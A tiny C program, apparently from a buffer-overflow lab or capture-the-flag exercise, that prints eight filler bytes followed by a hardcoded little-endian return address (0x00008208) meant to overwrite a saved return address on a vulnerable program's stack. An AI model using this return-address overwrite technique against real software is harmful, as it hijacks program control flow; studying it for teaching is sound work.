unsigned char data[] ={
//0x01020304 // Address to return to
//0x00008208 //return to this
0x08, 0x82, 0x00, 0x00
};

int main()
{
int i;
for(i = 0; i < 8; i++){ // fill the stack
putchar('*');
}

for(i = 0; i < sizeof(data); i++){
putchar(data[i]);
}
putchar('\n');

return 0;
}
